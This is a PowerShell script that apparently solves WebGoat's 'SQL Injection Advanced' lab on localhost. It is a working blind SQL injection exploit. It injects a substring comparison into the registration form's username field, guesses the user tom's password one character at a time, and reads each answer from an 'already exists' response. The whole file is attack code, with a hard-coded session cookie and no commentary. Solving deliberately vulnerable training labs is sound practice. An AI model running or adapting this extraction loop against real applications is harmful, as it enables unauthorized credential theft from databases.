# SQL Injection Password Extractor - PowerShell Version

$url = "http://localhost:8001/WebGoat/SqlInjectionAdvanced/register"
$webgoatSessionId = "1A4A662E7F7EB355E185016813D8229B"

$headers = @{
    "Cookie" = "JSESSIONID=$webgoatSessionId"
    "Content-Type" = "application/x-www-form-urlencoded; charset=UTF-8"
    "Referer" = "http://localhost:8001/WebGoat/start.mvc"
    "Origin" = "http://localhost:8001"
    "Host" = "localhost:8001"
    "sec-ch-ua" = "`"Not?A_Brand`";v=`"8`", `"Chromium`";v=`"108`""
    "Accept" = "*/*"
    "X-Requested-With" = "XMLHttpRequest"
    "sec-ch-ua-mobile" = "?0"
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36"
    "sec-ch-ua-platform" = "`"macOS`""
    "Sec-Fetch-Site" = "same-origin"
    "Sec-Fetch-Mode" = "cors"
    "Sec-Fetch-Dest" = "empty"
    "Accept-Language" = "en-US,en;q=0.9"
}

$password = ""
$charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

Write-Host "Starting SQL Injection attack to extract password..." -ForegroundColor Green
Write-Host ""

for ($length = 1; $length -le 25; $length++) {
    $found = $false
    
    foreach ($letter in $charset.ToCharArray()) {
        $params = "username_reg=tom'+AND+substring(password%2C1%2C$length)%3D'$password$letter&email_reg=test%40test.test&password_reg=test&confirm_password_reg=test"
        
        try {
            $response = Invoke-WebRequest -Uri $url -Method Put -Headers $headers -Body $params -UseBasicParsing -MaximumRedirection 0 -ErrorAction Stop
            
            Write-Host "Trying: $password$letter (Status: $($response.StatusCode))" -ForegroundColor Gray
            
            if ($response.Content -like "*already exists*") {
                $password += $letter
                Write-Host $password -ForegroundColor Cyan
                $found = $true
                break
            }
        }
        catch {
            Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "Make sure you are logged into WebGoat and on the SQL Injection Advanced challenge page" -ForegroundColor Yellow
            return
        }
    }
    
    if (-not $found) {
        break
    }
}

Write-Host ""
Write-Host ""
Write-Host "Password found: $password" -ForegroundColor Green
